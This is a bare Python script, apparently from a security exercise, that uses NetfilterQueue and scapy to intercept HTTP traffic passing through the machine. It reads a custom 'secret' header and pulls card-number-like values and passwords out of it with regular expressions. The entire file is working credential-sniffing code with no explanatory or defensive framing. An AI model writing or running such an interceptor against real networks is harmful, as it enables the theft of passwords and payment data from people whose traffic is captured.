from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers import http
import re

cc_pattern = re.compile('\s---\s([0-9\.]+)')
pws_pattern = re.compile('pwd\s---\s(.[^\s]+)')

secrets = set()

def process_packet(pkt):
    packet = IP(pkt.get_payload())

    if packet.haslayer(http.HTTPRequest):
        data = packet[http.HTTPRequest].fields['Unknown_Headers']['secret'.encode()].decode()
        for secret in cc_pattern.findall(data) + pws_pattern.findall(data):
            secrets.add(secret)

    pkt.accept()


def main():
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('End of processing')

    nfqueue.unbind()

if __name__ == '__main__':
    main()
